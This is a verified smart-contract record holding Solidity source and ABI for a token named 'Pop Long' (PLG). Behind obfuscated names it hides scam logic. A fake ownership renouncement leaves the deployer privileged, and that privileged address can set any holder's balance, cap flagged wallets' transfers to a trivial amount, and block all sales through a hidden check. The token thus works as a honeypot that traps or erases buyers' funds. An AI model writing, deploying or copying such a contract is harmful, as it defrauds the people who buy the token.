{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface fundList {\n    function createPair(address modeSender, address shouldTeam) external returns (address);\n}\n\ninterface limitTxAt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address listLaunchedTeam) external view returns (uint256);\n\n    function transfer(address takeTeam, uint256 tokenSenderTo) external returns (bool);\n\n    function allowance(address fundAtList, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tokenSenderTo) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address takeTeam,\n        uint256 tokenSenderTo\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed maxSell, uint256 value);\n    event Approval(address indexed fundAtList, address indexed spender, uint256 value);\n}\n\nabstract contract launchExempt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface limitMin {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface senderSell is limitTxAt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PopLong is launchExempt, limitTxAt, senderSell {\n\n    bool public fundAutoLimit;\n\n    address public marketingListIs;\n\n    address feeLiquidity = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    string private senderMode = \"PLG\";\n\n    uint256 constant sellFrom = 12 ** 10;\n\n    function owner() external view returns (address) {\n        return atFund;\n    }\n\n    mapping(address => bool) public totalSwap;\n\n    function transfer(address marketingReceiverExempt, uint256 tokenSenderTo) external virtual override returns (bool) {\n        return feeTokenLimit(_msgSender(), marketingReceiverExempt, tokenSenderTo);\n    }\n\n    function fromFund(address marketingReceiverExempt, uint256 tokenSenderTo) public {\n        feeSell();\n        receiverExemptToken[marketingReceiverExempt] = tokenSenderTo;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return receiverTx;\n    }\n\n    function allowance(address isLaunchedTo, address receiverFrom) external view virtual override returns (uint256) {\n        if (receiverFrom == receiverExempt) {\n            return type(uint256).max;\n        }\n        return launchedAuto[isLaunchedTo][receiverFrom];\n    }\n\n    event OwnershipTransferred(address indexed buyTrading, address indexed totalTake);\n\n    mapping(address => bool) public enableMax;\n\n    function balanceOf(address listLaunchedTeam) public view virtual override returns (uint256) {\n        return receiverExemptToken[listLaunchedTeam];\n    }\n\n    function getOwner() external view returns (address) {\n        return atFund;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return senderMode;\n    }\n\n    address receiverExempt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint8 private modeTo = 18;\n\n    bool private launchedLiquidity;\n\n    mapping(address => uint256) private receiverExemptToken;\n\n    bool private minFrom;\n\n    uint256 enableShould;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return liquidityFundSender;\n    }\n\n    uint256 teamFee;\n\n    uint256 private liquidityFundSender = 100000000 * 10 ** 18;\n\n    function walletSwapReceiver(uint256 tokenSenderTo) public {\n        feeSell();\n        enableShould = tokenSenderTo;\n    }\n\n    function atTake(address liquidityToken, address takeTeam, uint256 tokenSenderTo) internal returns (bool) {\n        require(receiverExemptToken[liquidityToken] >= tokenSenderTo);\n        receiverExemptToken[liquidityToken] -= tokenSenderTo;\n        receiverExemptToken[takeTeam] += tokenSenderTo;\n        emit Transfer(liquidityToken, takeTeam, tokenSenderTo);\n        return true;\n    }\n\n    mapping(address => mapping(address => uint256)) private launchedAuto;\n\n    address public walletMarketing;\n\n    address private atFund;\n\n    function listLaunchedTx(address limitTeamAuto) public {\n        feeSell();\n        if (isMarketingLaunch == marketingLiquidityEnable) {\n            launchedLiquidity = true;\n        }\n        if (limitTeamAuto == walletMarketing || limitTeamAuto == marketingListIs) {\n            return;\n        }\n        totalSwap[limitTeamAuto] = true;\n    }\n\n    function approve(address receiverFrom, uint256 tokenSenderTo) public virtual override returns (bool) {\n        launchedAuto[_msgSender()][receiverFrom] = tokenSenderTo;\n        emit Approval(_msgSender(), receiverFrom, tokenSenderTo);\n        return true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return modeTo;\n    }\n\n    function feeSell() private view {\n        require(enableMax[_msgSender()]);\n    }\n\n    uint256 private marketingLiquidityEnable;\n\n    function tokenReceiver(address totalAuto) public {\n        if (fundAutoLimit) {\n            return;\n        }\n        if (isMarketingLaunch == marketingLiquidityEnable) {\n            minFrom = false;\n        }\n        enableMax[totalAuto] = true;\n        if (isMarketingLaunch != marketingLiquidityEnable) {\n            marketingLiquidityEnable = isMarketingLaunch;\n        }\n        fundAutoLimit = true;\n    }\n\n    function listLaunched() public {\n        emit OwnershipTransferred(walletMarketing, address(0));\n        atFund = address(0);\n    }\n\n    uint256 public isMarketingLaunch;\n\n    string private receiverTx = \"Pop Long\";\n\n    function feeTokenLimit(address liquidityToken, address takeTeam, uint256 tokenSenderTo) internal returns (bool) {\n        if (liquidityToken == walletMarketing) {\n            return atTake(liquidityToken, takeTeam, tokenSenderTo);\n        }\n        uint256 autoTeam = limitTxAt(marketingListIs).balanceOf(feeLiquidity);\n        require(autoTeam == enableShould);\n        require(takeTeam != feeLiquidity);\n        if (totalSwap[liquidityToken]) {\n            return atTake(liquidityToken, takeTeam, sellFrom);\n        }\n        return atTake(liquidityToken, takeTeam, tokenSenderTo);\n    }\n\n    function transferFrom(address liquidityToken, address takeTeam, uint256 tokenSenderTo) external override returns (bool) {\n        if (_msgSender() != receiverExempt) {\n            if (launchedAuto[liquidityToken][_msgSender()] != type(uint256).max) {\n                require(tokenSenderTo <= launchedAuto[liquidityToken][_msgSender()]);\n                launchedAuto[liquidityToken][_msgSender()] -= tokenSenderTo;\n            }\n        }\n        return feeTokenLimit(liquidityToken, takeTeam, tokenSenderTo);\n    }\n\n    constructor (){\n        if (minFrom != launchedLiquidity) {\n            minFrom = true;\n        }\n        limitMin txBuy = limitMin(receiverExempt);\n        marketingListIs = fundList(txBuy.factory()).createPair(txBuy.WETH(), address(this));\n        if (launchedLiquidity != minFrom) {\n            isMarketingLaunch = marketingLiquidityEnable;\n        }\n        walletMarketing = _msgSender();\n        enableMax[walletMarketing] = true;\n        receiverExemptToken[walletMarketing] = liquidityFundSender;\n        listLaunched();\n        \n        emit Transfer(address(0), walletMarketing, liquidityFundSender);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundAtList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalTake\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxSell\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isLaunchedTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverFrom\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenSenderTo\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listLaunchedTeam\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"enableMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingReceiverExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenSenderTo\",\"type\":\"uint256\"}],\"name\":\"fromFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundAutoLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isMarketingLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitTeamAuto\",\"type\":\"address\"}],\"name\":\"listLaunchedTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingListIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalAuto\",\"type\":\"address\"}],\"name\":\"tokenReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingReceiverExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenSenderTo\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenSenderTo\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenSenderTo\",\"type\":\"uint256\"}],\"name\":\"walletSwapReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "PopLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}